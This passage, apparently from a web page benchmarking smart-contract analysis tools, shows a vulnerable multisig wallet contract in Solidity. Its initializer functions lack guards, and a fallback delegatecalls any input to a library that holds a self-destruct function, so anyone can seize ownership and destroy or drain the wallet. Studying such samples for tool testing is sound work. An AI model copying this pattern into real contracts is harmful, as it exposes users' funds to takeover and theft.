    <span class="kd">var</span> <span class="n">pending</span> <span class="o">=</span> <span class="n">m_pending</span><span class="p">[</span><span class="n">_operation</span><span class="p">];</span>
    <span class="kt">uint</span> <span class="n">ownerIndex</span> <span class="o">=</span> <span class="n">m_ownerIndex</span><span class="p">[</span><span class="kt">uint</span><span class="p">(</span><span class="n">_owner</span><span class="p">)];</span>

    <span class="c1">// make sure they&#39;re an owner</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">ownerIndex</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>

    <span class="c1">// determine the bit to set for this owner.</span>
    <span class="kt">uint</span> <span class="n">ownerIndexBit</span> <span class="o">=</span> <span class="mi">2</span><span class="o">**</span><span class="n">ownerIndex</span><span class="p">;</span>
    <span class="k">return</span> <span class="o">!</span><span class="p">(</span><span class="n">pending</span><span class="p">.</span><span class="n">ownersDone</span> <span class="o">&amp;</span> <span class="n">ownerIndexBit</span> <span class="o">==</span> <span class="mi">0</span><span class="p">);</span>
  <span class="p">}</span>

  <span class="c1">// constructor - stores initial daily limit and records the present day&#39;s index.</span>
  <span class="kd">function</span> <span class="n">initDaylimit</span><span class="p">(</span><span class="kt">uint</span> <span class="n">_limit</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">m_dailyLimit</span> <span class="o">=</span> <span class="n">_limit</span><span class="p">;</span>
    <span class="n">m_lastDay</span> <span class="o">=</span> <span class="n">today</span><span class="p">();</span>
  <span class="p">}</span>
  <span class="c1">// (re)sets the daily limit. needs many of the owners to confirm. doesn&#39;t alter the amount already spent today.</span>
  <span class="kd">function</span> <span class="n">setDailyLimit</span><span class="p">(</span><span class="kt">uint</span> <span class="n">_newLimit</span><span class="p">)</span> <span class="n">onlymanyowners</span><span class="p">(</span><span class="nf">sha3</span><span class="p">(</span><span class="nb">msg.data</span><span class="p">))</span> <span class="kr">external</span> <span class="p">{</span>
    <span class="n">m_dailyLimit</span> <span class="o">=</span> <span class="n">_newLimit</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="c1">// resets the amount already spent today. needs many of the owners to confirm.</span>
  <span class="kd">function</span> <span class="n">resetSpentToday</span><span class="p">()</span> <span class="n">onlymanyowners</span><span class="p">(</span><span class="nf">sha3</span><span class="p">(</span><span class="nb">msg.data</span><span class="p">))</span> <span class="kr">external</span> <span class="p">{</span>
    <span class="n">m_spentToday</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="p">}</span>

  <span class="c1">// constructor - just pass on the owner array to the multiowned and</span>
  <span class="c1">// the limit to daylimit</span>
  <span class="kd">function</span> <span class="n">initWallet</span><span class="p">(</span><span class="kt">address</span><span class="p">[]</span> <span class="n">_owners</span><span class="p">,</span> <span class="kt">uint</span> <span class="n">_required</span><span class="p">,</span> <span class="kt">uint</span> <span class="n">_daylimit</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">initDaylimit</span><span class="p">(</span><span class="n">_daylimit</span><span class="p">);</span>
    <span class="n">initMultiowned</span><span class="p">(</span><span class="n">_owners</span><span class="p">,</span> <span class="n">_required</span><span class="p">);</span>
  <span class="p">}</span>

  <span class="c1">// kills the contract sending everything to `_to`.</span>
  <span class="kd">function</span> <span class="n">kill</span><span class="p">(</span><span class="kt">address</span> <span class="n">_to</span><span class="p">)</span> <span class="n">onlymanyowners</span><span class="p">(</span><span class="nf">sha3</span><span class="p">(</span><span class="nb">msg.data</span><span class="p">))</span> <span class="kr">external</span> <span class="p">{</span>
    <span class="nb">suicide</span><span class="p">(</span><span class="n">_to</span><span class="p">);</span>
  <span class="p">}</span>

  <span class="c1">// Outside-visible transact entry point. Executes transaction immediately if below daily spend limit.</span>
  <span class="c1">// If not, goes into multisig process. We provide a hash on return to allow the sender to provide</span>
  <span class="c1">// shortcuts for the other confirmations (allowing them to avoid replicating the _to, _value</span>
  <span class="c1">// and _data arguments). They still get the option of using them if they want, anyways.</span>
  <span class="kd">function</span> <span class="n">execute</span><span class="p">(</span><span class="kt">address</span> <span class="n">_to</span><span class="p">,</span> <span class="kt">uint</span> <span class="n">_value</span><span class="p">,</span> <span class="kt">bytes</span> <span class="n">_data</span><span class="p">)</span> <span class="kr">external</span> <span class="n">onlyowner</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">bytes32</span> <span class="n">o_hash</span><span class="p">)</span> <span class="p">{</span>
    <span class="c1">// first, take the opportunity to check that we&#39;re under the daily limit.</span>
    <span class="k">if</span> <span class="p">((</span><span class="n">_data</span><span class="p">.</span><span class="n">length</span> <span class="o">==</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="n">underLimit</span><span class="p">(</span><span class="n">_value</span><span class="p">))</span> <span class="o">||</span> <span class="n">m_required</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
      <span class="c1">// yes - just execute the call.</span>
      <span class="kt">address</span> <span class="n">created</span><span class="p">;</span>
      <span class="k">if</span> <span class="p">(</span><span class="n">_to</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">created</span> <span class="o">=</span> <span class="n">create</span><span class="p">(</span><span class="n">_value</span><span class="p">,</span> <span class="n">_data</span><span class="p">);</span>
      <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">_to</span><span class="p">.</span><span class="nf">call</span><span class="p">.</span><span class="n">value</span><span class="p">(</span><span class="n">_value</span><span class="p">)(</span><span class="n">_data</span><span class="p">))</span>
          <span class="k">throw</span><span class="p">;</span>
      <span class="p">}</span>
      <span class="n">SingleTransact</span><span class="p">(</span><span class="nb">msg.sender</span><span class="p">,</span> <span class="n">_value</span><span class="p">,</span> <span class="n">_to</span><span class="p">,</span> <span class="n">_data</span><span class="p">,</span> <span class="n">created</span><span class="p">);</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
      <span class="c1">// determine our operation hash.</span>
      <span class="n">o_hash</span> <span class="o">=</span> <span class="nf">sha3</span><span class="p">(</span><span class="nb">msg.data</span><span class="p">,</span> <span class="nb">block.number</span><span class="p">);</span>
      <span class="c1">// store if it&#39;s new</span>
      <span class="k">if</span> <span class="p">(</span><span class="n">m_txs</span><span class="p">[</span><span class="n">o_hash</span><span class="p">].</span><span class="n">to</span> <span class="o">==</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="n">m_txs</span><span class="p">[</span><span class="n">o_hash</span><span class="p">].</span><span class="n">value</span> <span class="o">==</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="n">m_txs</span><span class="p">[</span><span class="n">o_hash</span><span class="p">].</span><span class="n">data</span><span class="p">.</span><span class="n">length</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">m_txs</span><span class="p">[</span><span class="n">o_hash</span><span class="p">].</span><span class="n">to</span> <span class="o">=</span> <span class="n">_to</span><span class="p">;</span>
        <span class="n">m_txs</span><span class="p">[</span><span class="n">o_hash</span><span class="p">].</span><span class="n">value</span> <span class="o">=</span> <span class="n">_value</span><span class="p">;</span>
        <span class="n">m_txs</span><span class="p">[</span><span class="n">o_hash</span><span class="p">].</span><span class="n">data</span> <span class="o">=</span> <span class="n">_data</span><span class="p">;</span>
      <span class="p">}</span>
      <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">confirm</span><span class="p">(</span><span class="n">o_hash</span><span class="p">))</span> <span class="p">{</span>
        <span class="n">ConfirmationNeeded</span><span class="p">(</span><span class="n">o_hash</span><span class="p">,</span> <span class="nb">msg.sender</span><span class="p">,</span> <span class="n">_value</span><span class="p">,</span> <span class="n">_to</span><span class="p">,</span> <span class="n">_data</span><span class="p">);</span>
      <span class="p">}</span>
    <span class="p">}</span>
  <span class="p">}</span>

  <span class="kd">function</span> <span class="n">create</span><span class="p">(</span><span class="kt">uint</span> <span class="n">_value</span><span class="p">,</span> <span class="kt">bytes</span> <span class="n">_code</span><span class="p">)</span> <span class="kr">internal</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">address</span> <span class="n">o_addr</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">assembly</span> <span class="p">{</span>
      <span class="n">o_addr</span> <span class="o">:=</span> <span class="nf">create</span><span class="p">(</span><span class="n">_value</span><span class="p">,</span> <span class="nf">add</span><span class="p">(</span><span class="n">_code</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">),</span> <span class="nf">mload</span><span class="p">(</span><span class="n">_code</span><span class="p">))</span>
      <span class="nf">jumpi</span><span class="p">(</span><span class="n">invalidJumpLabel</span><span class="p">,</span> <span class="nf">iszero</span><span class="p">(</span><span class="nf">extcodesize</span><span class="p">(</span><span class="n">o_addr</span><span class="p">)))</span>
    <span class="p">}</span>
  <span class="p">}</span>

  <span class="c1">// confirm a transaction through just the hash. we use the previous transactions map, m_txs, in order</span>
  <span class="c1">// to determine the body of the transaction from the hash provided.</span>
  <span class="kd">function</span> <span class="n">confirm</span><span class="p">(</span><span class="kt">bytes32</span> <span class="n">_h</span><span class="p">)</span> <span class="n">onlymanyowners</span><span class="p">(</span><span class="n">_h</span><span class="p">)</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">bool</span> <span class="n">o_success</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">m_txs</span><span class="p">[</span><span class="n">_h</span><span class="p">].</span><span class="n">to</span> <span class="o">!=</span> <span class="mi">0</span> <span class="o">||</span> <span class="n">m_txs</span><span class="p">[</span><span class="n">_h</span><span class="p">].</span><span class="n">value</span> <span class="o">!=</span> <span class="mi">0</span> <span class="o">||</span> <span class="n">m_txs</span><span class="p">[</span><span class="n">_h</span><span class="p">].</span><span class="n">data</span><span class="p">.</span><span class="n">length</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
      <span class="kt">address</span> <span class="n">created</span><span class="p">;</span>
      <span class="k">if</span> <span class="p">(</span><span class="n">m_txs</span><span class="p">[</span><span class="n">_h</span><span class="p">].</span><span class="n">to</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">created</span> <span class="o">=</span> <span class="n">create</span><span class="p">(</span><span class="n">m_txs</span><span class="p">[</span><span class="n">_h</span><span class="p">].</span><span class="n">value</span><span class="p">,</span> <span class="n">m_txs</span><span class="p">[</span><span class="n">_h</span><span class="p">].</span><span class="n">data</span><span class="p">);</span>
      <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">m_txs</span><span class="p">[</span><span class="n">_h</span><span class="p">].</span><span class="n">to</span><span class="p">.</span><span class="nf">call</span><span class="p">.</span><span class="n">value</span><span class="p">(</span><span class="n">m_txs</span><span class="p">[</span><span class="n">_h</span><span class="p">].</span><span class="n">value</span><span class="p">)(</span><span class="n">m_txs</span><span class="p">[</span><span class="n">_h</span><span class="p">].</span><span class="n">data</span><span class="p">))</span>
          <span class="k">throw</span><span class="p">;</span>
      <span class="p">}</span>

      <span class="n">MultiTransact</span><span class="p">(</span><span class="nb">msg.sender</span><span class="p">,</span> <span class="n">_h</span><span class="p">,</span> <span class="n">m_txs</span><span class="p">[</span><span class="n">_h</span><span class="p">].</span><span class="n">value</span><span class="p">,</span> <span class="n">m_txs</span><span class="p">[</span><span class="n">_h</span><span class="p">].</span><span class="n">to</span><span class="p">,</span> <span class="n">m_txs</span><span class="p">[</span><span class="n">_h</span><span class="p">].</span><span class="n">data</span><span class="p">,</span> <span class="n">created</span><span class="p">);</span>
      <span class="k">delete</span> <span class="n">m_txs</span><span class="p">[</span><span class="n">_h</span><span class="p">];</span>
      <span class="k">return</span> <span class="kc">true</span><span class="p">;</span>
    <span class="p">}</span>
  <span class="p">}</span>

  <span class="c1">// INTERNAL METHODS</span>

  <span class="kd">function</span> <span class="n">confirmAndCheck</span><span class="p">(</span><span class="kt">bytes32</span> <span class="n">_operation</span><span class="p">)</span> <span class="kr">internal</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">bool</span><span class="p">)</span> <span class="p">{</span>
    <span class="c1">// determine what index the present sender is:</span>
    <span class="kt">uint</span> <span class="n">ownerIndex</span> <span class="o">=</span> <span class="n">m_ownerIndex</span><span class="p">[</span><span class="kt">uint</span><span class="p">(</span><span class="nb">msg.sender</span><span class="p">)];</span>
    <span class="c1">// make sure they&#39;re an owner</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">ownerIndex</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="k">return</span><span class="p">;</span>

    <span class="kd">var</span> <span class="n">pending</span> <span class="o">=</span> <span class="n">m_pending</span><span class="p">[</span><span class="n">_operation</span><span class="p">];</span>
    <span class="c1">// if we&#39;re not yet working on this operation, switch over and reset the confirmation status.</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">pending</span><span class="p">.</span><span class="n">yetNeeded</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
      <span class="c1">// reset count of confirmations needed.</span>
      <span class="n">pending</span><span class="p">.</span><span class="n">yetNeeded</span> <span class="o">=</span> <span class="n">m_required</span><span class="p">;</span>
      <span class="c1">// reset which owners have confirmed (none) - set our bitmap to 0.</span>
      <span class="n">pending</span><span class="p">.</span><span class="n">ownersDone</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
      <span class="n">pending</span><span class="p">.</span><span class="n">index</span> <span class="o">=</span> <span class="n">m_pendingIndex</span><span class="p">.</span><span class="n">length</span><span class="o">++</span><span class="p">;</span>
      <span class="n">m_pendingIndex</span><span class="p">[</span><span class="n">pending</span><span class="p">.</span><span class="n">index</span><span class="p">]</span> <span class="o">=</span> <span class="n">_operation</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="c1">// determine the bit to set for this owner.</span>
    <span class="kt">uint</span> <span class="n">ownerIndexBit</span> <span class="o">=</span> <span class="mi">2</span><span class="o">**</span><span class="n">ownerIndex</span><span class="p">;</span>
    <span class="c1">// make sure we (the message sender) haven&#39;t confirmed this operation previously.</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">pending</span><span class="p">.</span><span class="n">ownersDone</span> <span class="o">&amp;</span> <span class="n">ownerIndexBit</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
      <span class="n">Confirmation</span><span class="p">(</span><span class="nb">msg.sender</span><span class="p">,</span> <span class="n">_operation</span><span class="p">);</span>
      <span class="c1">// ok - check if count is enough to go ahead.</span>
      <span class="k">if</span> <span class="p">(</span><span class="n">pending</span><span class="p">.</span><span class="n">yetNeeded</span> <span class="o">&lt;=</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
        <span class="c1">// enough confirmations: reset and run interior.</span>
        <span class="k">delete</span> <span class="n">m_pendingIndex</span><span class="p">[</span><span class="n">m_pending</span><span class="p">[</span><span class="n">_operation</span><span class="p">].</span><span class="n">index</span><span class="p">];</span>
        <span class="k">delete</span> <span class="n">m_pending</span><span class="p">[</span><span class="n">_operation</span><span class="p">];</span>
        <span class="k">return</span> <span class="kc">true</span><span class="p">;</span>
      <span class="p">}</span>
      <span class="k">else</span>
      <span class="p">{</span>
        <span class="c1">// not enough: record that this owner in particular confirmed.</span>
        <span class="n">pending</span><span class="p">.</span><span class="n">yetNeeded</span><span class="o">--</span><span class="p">;</span>
        <span class="n">pending</span><span class="p">.</span><span class="n">ownersDone</span> <span class="o">|=</span> <span class="n">ownerIndexBit</span><span class="p">;</span>
      <span class="p">}</span>
    <span class="p">}</span>
  <span class="p">}</span>

  <span class="kd">function</span> <span class="n">reorganizeOwners</span><span class="p">()</span> <span class="kr">private</span> <span class="p">{</span>
    <span class="kt">uint</span> <span class="n">free</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
    <span class="k">while</span> <span class="p">(</span><span class="n">free</span> <span class="o">&lt;</span> <span class="n">m_numOwners</span><span class="p">)</span>
    <span class="p">{</span>
      <span class="k">while</span> <span class="p">(</span><span class="n">free</span> <span class="o">&lt;</span> <span class="n">m_numOwners</span> <span class="o">&amp;&amp;</span> <span class="n">m_owners</span><span class="p">[</span><span class="n">free</span><span class="p">]</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="n">free</span><span class="o">++</span><span class="p">;</span>
      <span class="k">while</span> <span class="p">(</span><span class="n">m_numOwners</span> <span class="o">&gt;</span> <span class="mi">1</span> <span class="o">&amp;&amp;</span> <span class="n">m_owners</span><span class="p">[</span><span class="n">m_numOwners</span><span class="p">]</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="n">m_numOwners</span><span class="o">--</span><span class="p">;</span>
      <span class="k">if</span> <span class="p">(</span><span class="n">free</span> <span class="o">&lt;</span> <span class="n">m_numOwners</span> <span class="o">&amp;&amp;</span> <span class="n">m_owners</span><span class="p">[</span><span class="n">m_numOwners</span><span class="p">]</span> <span class="o">!=</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="n">m_owners</span><span class="p">[</span><span class="n">free</span><span class="p">]</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
      <span class="p">{</span>
        <span class="n">m_owners</span><span class="p">[</span><span class="n">free</span><span class="p">]</span> <span class="o">=</span> <span class="n">m_owners</span><span class="p">[</span><span class="n">m_numOwners</span><span class="p">];</span>
        <span class="n">m_ownerIndex</span><span class="p">[</span><span class="n">m_owners</span><span class="p">[</span><span class="n">free</span><span class="p">]]</span> <span class="o">=</span> <span class="n">free</span><span class="p">;</span>
        <span class="n">m_owners</span><span class="p">[</span><span class="n">m_numOwners</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
      <span class="p">}</span>
    <span class="p">}</span>
  <span class="p">}</span>

  <span class="c1">// checks to see if there is at least `_value` left from the daily limit today. if there is, subtracts it and</span>
  <span class="c1">// returns true. otherwise just returns false.</span>
  <span class="kd">function</span> <span class="n">underLimit</span><span class="p">(</span><span class="kt">uint</span> <span class="n">_value</span><span class="p">)</span> <span class="kr">internal</span> <span class="n">onlyowner</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">bool</span><span class="p">)</span> <span class="p">{</span>
    <span class="c1">// reset the spend limit if we&#39;re on a different day to last time.</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">today</span><span class="p">()</span> <span class="o">&gt;</span> <span class="n">m_lastDay</span><span class="p">)</span> <span class="p">{</span>
      <span class="n">m_spentToday</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
      <span class="n">m_lastDay</span> <span class="o">=</span> <span class="n">today</span><span class="p">();</span>
    <span class="p">}</span>
    <span class="c1">// check to see if there&#39;s enough left - if so, subtract and return true.</span>
    <span class="c1">// overflow protection                    // dailyLimit check</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">m_spentToday</span> <span class="o">+</span> <span class="n">_value</span> <span class="o">&gt;=</span> <span class="n">m_spentToday</span> <span class="o">&amp;&amp;</span> <span class="n">m_spentToday</span> <span class="o">+</span> <span class="n">_value</span> <span class="o">&lt;=</span> <span class="n">m_dailyLimit</span><span class="p">)</span> <span class="p">{</span>
      <span class="n">m_spentToday</span> <span class="o">+=</span> <span class="n">_value</span><span class="p">;</span>
      <span class="k">return</span> <span class="kc">true</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
  <span class="p">}</span>

  <span class="c1">// determines today&#39;s index.</span>
  <span class="kd">function</span> <span class="n">today</span><span class="p">()</span> <span class="kr">private</span> <span class="kr">constant</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">uint</span><span class="p">)</span> <span class="p">{</span> <span class="k">return</span> <span class="nb">now</span> <span class="o">/</span> <span class="mi">1</span> <span class="kc">days</span><span class="p">;</span> <span class="p">}</span>

  <span class="kd">function</span> <span class="n">clearPending</span><span class="p">()</span> <span class="kr">internal</span> <span class="p">{</span>
    <span class="kt">uint</span> <span class="n">length</span> <span class="o">=</span> <span class="n">m_pendingIndex</span><span class="p">.</span><span class="n">length</span><span class="p">;</span>

    <span class="k">for</span> <span class="p">(</span><span class="kt">uint</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">length</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span> <span class="p">{</span>
      <span class="k">delete</span> <span class="n">m_txs</span><span class="p">[</span><span class="n">m_pendingIndex</span><span class="p">[</span><span class="n">i</span><span class="p">]];</span>

      <span class="k">if</span> <span class="p">(</span><span class="n">m_pendingIndex</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span>
        <span class="k">delete</span> <span class="n">m_pending</span><span class="p">[</span><span class="n">m_pendingIndex</span><span class="p">[</span><span class="n">i</span><span class="p">]];</span>
    <span class="p">}</span>

    <span class="k">delete</span> <span class="n">m_pendingIndex</span><span class="p">;</span>
  <span class="p">}</span>

  <span class="c1">// FIELDS</span>
  <span class="kt">address</span> <span class="kr">constant</span> <span class="n">_walletLibrary</span> <span class="o">=</span> <span class="mh">0xcafecafecafecafecafecafecafecafecafecafe</span><span class="p">;</span>

  <span class="c1">// the number of owners that must confirm the same operation before it is run.</span>
  <span class="kt">uint</span> <span class="kr">public</span> <span class="n">m_required</span><span class="p">;</span>
  <span class="c1">// pointer used to find a free slot in m_owners</span>
  <span class="kt">uint</span> <span class="kr">public</span> <span class="n">m_numOwners</span><span class="p">;</span>

  <span class="kt">uint</span> <span class="kr">public</span> <span class="n">m_dailyLimit</span><span class="p">;</span>
  <span class="kt">uint</span> <span class="kr">public</span> <span class="n">m_spentToday</span><span class="p">;</span>
  <span class="kt">uint</span> <span class="kr">public</span> <span class="n">m_lastDay</span><span class="p">;</span>

  <span class="c1">// list of owners</span>
  <span class="kt">uint</span><span class="p">[</span><span class="mi">256</span><span class="p">]</span> <span class="n">m_owners</span><span class="p">;</span>

  <span class="kt">uint</span> <span class="kr">constant</span> <span class="n">c_maxOwners</span> <span class="o">=</span> <span class="mi">250</span><span class="p">;</span>
  <span class="c1">// index on the list of owners to allow reverse lookup</span>
  <span class="kd">mapping</span><span class="p">(</span><span class="kt">uint</span> <span class="o">=&gt;</span> <span class="kt">uint</span><span class="p">)</span> <span class="n">m_ownerIndex</span><span class="p">;</span>
  <span class="c1">// the ongoing operations.</span>
  <span class="kd">mapping</span><span class="p">(</span><span class="kt">bytes32</span> <span class="o">=&gt;</span> <span class="n">PendingState</span><span class="p">)</span> <span class="n">m_pending</span><span class="p">;</span>
  <span class="kt">bytes32</span><span class="p">[]</span> <span class="n">m_pendingIndex</span><span class="p">;</span>

  <span class="c1">// pending transactions we have at present.</span>
  <span class="kd">mapping</span> <span class="p">(</span><span class="kt">bytes32</span> <span class="o">=&gt;</span> <span class="n">Transaction</span><span class="p">)</span> <span class="n">m_txs</span><span class="p">;</span>
<span class="p">}</span>

<span class="kd">contract</span> <span class="n">Wallet</span> <span class="kr">is</span> <span class="n">WalletEvents</span> <span class="p">{</span>

  <span class="c1">// WALLET CONSTRUCTOR</span>
  <span class="c1">//   calls the `initWallet` method of the Library in this context</span>
  <span class="kd">function</span> <span class="n">Wallet</span><span class="p">(</span><span class="kt">address</span><span class="p">[]</span> <span class="n">_owners</span><span class="p">,</span> <span class="kt">uint</span> <span class="n">_required</span><span class="p">,</span> <span class="kt">uint</span> <span class="n">_daylimit</span><span class="p">)</span> <span class="p">{</span>
    <span class="c1">// Signature of the Wallet Library&#39;s init function</span>
    <span class="kt">bytes4</span> <span class="n">sig</span> <span class="o">=</span> <span class="kt">bytes4</span><span class="p">(</span><span class="nf">sha3</span><span class="p">(</span><span class="s">&quot;initWallet(address[],uint256,uint256)&quot;</span><span class="p">));</span>
    <span class="kt">address</span> <span class="n">target</span> <span class="o">=</span> <span class="n">_walletLibrary</span><span class="p">;</span>

    <span class="c1">// Compute the size of the call data : arrays has 2</span>
    <span class="c1">// 32bytes for offset and length, plus 32bytes per element ;</span>
    <span class="c1">// plus 2 32bytes for each uint</span>
    <span class="kt">uint</span> <span class="n">argarraysize</span> <span class="o">=</span> <span class="p">(</span><span class="mi">2</span> <span class="o">+</span> <span class="n">_owners</span><span class="p">.</span><span class="n">length</span><span class="p">);</span>
    <span class="kt">uint</span> <span class="n">argsize</span> <span class="o">=</span> <span class="p">(</span><span class="mi">2</span> <span class="o">+</span> <span class="n">argarraysize</span><span class="p">)</span> <span class="o">*</span> <span class="mi">32</span><span class="p">;</span>

    <span class="k">assembly</span> <span class="p">{</span>
      <span class="c1">// Add the signature first to memory</span>
      <span class="nf">mstore</span><span class="p">(</span><span class="mh">0x0</span><span class="p">,</span> <span class="n">sig</span><span class="p">)</span>
      <span class="c1">// Add the call data, which is at the end of the</span>
      <span class="c1">// code</span>
      <span class="nf">codecopy</span><span class="p">(</span><span class="mh">0x4</span><span class="p">,</span>  <span class="nf">sub</span><span class="p">(</span><span class="nf">codesize</span><span class="p">,</span> <span class="n">argsize</span><span class="p">),</span> <span class="n">argsize</span><span class="p">)</span>
      <span class="c1">// Delegate call to the library</span>
      <span class="nf">delegatecall</span><span class="p">(</span><span class="nf">sub</span><span class="p">(</span><span class="nf">gas</span><span class="p">,</span> <span class="mi">10000</span><span class="p">),</span> <span class="n">target</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">,</span> <span class="nf">add</span><span class="p">(</span><span class="n">argsize</span><span class="p">,</span> <span class="mh">0x4</span><span class="p">),</span> <span class="mh">0x0</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">)</span>
    <span class="p">}</span>
  <span class="p">}</span>

  <span class="c1">// METHODS</span>

  <span class="c1">// gets called when no other function matches</span>
  <span class="kd">function</span><span class="p">()</span> <span class="kr">payable</span> <span class="p">{</span>
    <span class="c1">// just being sent some cash?</span>
    <span class="k">if</span> <span class="p">(</span><span class="nb">msg.value</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span>
      <span class="n">Deposit</span><span class="p">(</span><span class="nb">msg.sender</span><span class="p">,</span> <span class="nb">msg.value</span><span class="p">);</span>
    <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nb">msg.data</span><span class="p">.</span><span class="n">length</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span>
      <span class="n">_walletLibrary</span><span class="p">.</span><span class="nf">delegatecall</span><span class="p">(</span><span class="nb">msg.data</span><span class="p">);</span>
  <span class="p">}</span>

  <span class="c1">// Gets an owner by 0-indexed position (using numOwners as the count)</span>
  <span class="kd">function</span> <span class="n">getOwner</span><span class="p">(</span><span class="kt">uint</span> <span class="n">ownerIndex</span><span class="p">)</span> <span class="kr">constant</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">address</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">return</span> <span class="kt">address</span><span class="p">(</span><span class="n">m_owners</span><span class="p">[</span><span class="n">ownerIndex</span> <span class="o">+</span> <span class="mi">1</span><span class="p">]);</span>
  <span class="p">}</span>

  <span class="c1">// As return statement unavailable in fallback, explicit the method here</span>

  <span class="kd">function</span> <span class="n">hasConfirmed</span><span class="p">(</span><span class="kt">bytes32</span> <span class="n">_operation</span><span class="p">,</span> <span class="kt">address</span> <span class="n">_owner</span><span class="p">)</span> <span class="kr">external</span> <span class="kr">constant</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">bool</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">return</span> <span class="n">_walletLibrary</span><span class="p">.</span><span class="nf">delegatecall</span><span class="p">(</span><span class="nb">msg.data</span><span class="p">);</span>
  <span class="p">}</span>

  <span class="kd">function</span> <span class="n">isOwner</span><span class="p">(</span><span class="kt">address</span> <span class="n">_addr</span><span class="p">)</span> <span class="kr">constant</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">bool</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">return</span> <span class="n">_walletLibrary</span><span class="p">.</span><span class="nf">delegatecall</span><span class="p">(</span><span class="nb">msg.data</span><span class="p">);</span>
  <span class="p">}</span>

  <span class="c1">// FIELDS</span>
  <span class="kt">address</span> <span class="kr">constant</span> <span class="n">_walletLibrary</span> <span class="o">=</span> <span class="mh">0xcafecafecafecafecafecafecafecafecafecafe</span><span class="p">;</span>

  <span class="c1">// the number of owners that must confirm the same operation before it is run.</span>
  <span class="kt">uint</span> <span class="kr">public</span> <span class="n">m_required</span><span class="p">;</span>
  <span class="c1">// pointer used to find a free slot in m_owners</span>
  <span class="kt">uint</span> <span class="kr">public</span> <span class="n">m_numOwners</span><span class="p">;</span>

  <span class="kt">uint</span> <span class="kr">public</span> <span class="n">m_dailyLimit</span><span class="p">;</span>
  <span class="kt">uint</span> <span class="kr">public</span> <span class="n">m_spentToday</span><span class="p">;</span>
  <span class="kt">uint</span> <span class="kr">public</span> <span class="n">m_lastDay</span><span class="p">;</span>

  <span class="c1">// list of owners</span>
  <span class="kt">uint</span><span class="p">[</span><span class="mi">256</span><span class="p">]</span> <span class="n">m_owners</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>

          <hr>
    <h3 id=variable shadowing/inherited_state>
      <a href="https://github.com/trailofbits/not-so-smart-contracts/tree/master//variable shadowing/inherited_state.sol">variable shadowing/inherited_state</a>
    </h3>
    <table>
      <tr style="font-weight: bold">
        <td>Bug Type</td>
	          <td colspan="2">
          Mythril
          <br>
          <span style="font-size: 10px">v0.18.11</span>
      </tr>
      <tr>
        <td>Variable Shadowing</td>
	        <td style="background-color:
		   rgba(80, 200, 120, .4)">
